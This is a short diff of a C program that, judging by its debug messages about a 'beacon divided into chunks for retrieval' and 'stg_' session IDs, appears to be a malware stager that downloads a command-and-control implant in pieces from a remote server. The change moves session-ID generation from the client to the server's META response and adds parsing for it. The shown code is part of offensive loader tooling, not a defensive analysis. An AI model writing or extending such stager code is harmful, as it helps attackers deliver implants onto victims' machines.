@@ -956,11 +956,11 @@ int main(int argc, char *argv[]) {
     DEBUG_PRINT("[*] Response: %s\n", response);
     DEBUG_PRINT("[*] ========================================\n");
     
-    // Parse metadata response: META|<total_chunks>
+    // Parse metadata response: META|<session_id>|<total_chunks>
     if (strncmp(response, "META|", 5) != 0) {
     DEBUG_PRINT("[!] ========================================\n");
     DEBUG_PRINT("[!] ERROR: Invalid META response format!\n");
-    DEBUG_PRINT("[!] Expected: META|<number>\n");
+    DEBUG_PRINT("[!] Expected: META|<session_id>|<number>\n");
     DEBUG_PRINT("[!] Received: %s\n", response);
     DEBUG_PRINT("[!] Length: %zu bytes\n", strlen(response));
     DEBUG_PRINT("[!] First 20 chars: %.20s\n", response);
@@ -968,8 +968,26 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    // Parse the response - format: META|total_chunks
-    total_chunks = atoi(response + 5);
+    // Parse session ID and chunk count from response
+    // Format: META|stg_1234567890_1234|3457
+    char *pipe1 = strchr(response + 5, '|');
+    if (!pipe1) {
+    DEBUG_PRINT("[!] ERROR: Missing session ID in META response\n");
+        return 1;
+    }
+    
+    // Extract session ID
+    size_t session_id_len = pipe1 - (response + 5);
+    if (session_id_len >= sizeof(session_id)) {
+    DEBUG_PRINT("[!] ERROR: Session ID too long\n");
+        return 1;
+    }
+    strncpy(session_id, response + 5, session_id_len);
+    session_id[session_id_len] = '\0';
+    
+    // Extract chunk count
+    total_chunks = atoi(pipe1 + 1);
+    DEBUG_PRINT("[*] Session ID: %s\n", session_id);
     DEBUG_PRINT("[*] Parsed chunk count: %d\n", total_chunks);
     
     if (total_chunks <= 0 || total_chunks > MAX_CHUNKS) {
@@ -978,11 +996,6 @@ int main(int argc, char *argv[]) {
     }
     
     DEBUG_PRINT("[*] Beacon divided into %d chunks for retrieval\n", total_chunks);
-    
-    // Generate session ID (timestamp + random)
-    snprintf(session_id, sizeof(session_id), "stg_%lu_%d", 
-             (unsigned long)time(NULL), rand() % 10000);
-    DEBUG_PRINT("[*] Session ID: %s\n", session_id);
     
     // Allocate chunk storage
     chunks = calloc(total_chunks, sizeof(unsigned char *));
